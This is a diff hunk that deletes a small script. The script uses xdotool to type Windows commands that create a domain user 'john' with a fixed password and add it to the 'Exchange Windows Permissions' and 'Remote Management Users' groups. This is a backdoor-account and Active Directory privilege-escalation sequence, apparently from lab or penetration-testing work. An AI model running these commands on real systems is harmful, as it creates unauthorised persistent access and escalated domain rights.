@@ -1,9 +1,0 @@
-xdotool type --delay 10 "net user john abc123! /add /domain"
-xdotool key Return
-
-xdotool type --delay 10 "net group "Exchange Windows Permissions" john /add"
-xdotool key Return
-
-xdotool type --delay 10 "net localgroup "Remote Management Users" john /add"
-xdotool key Return
-
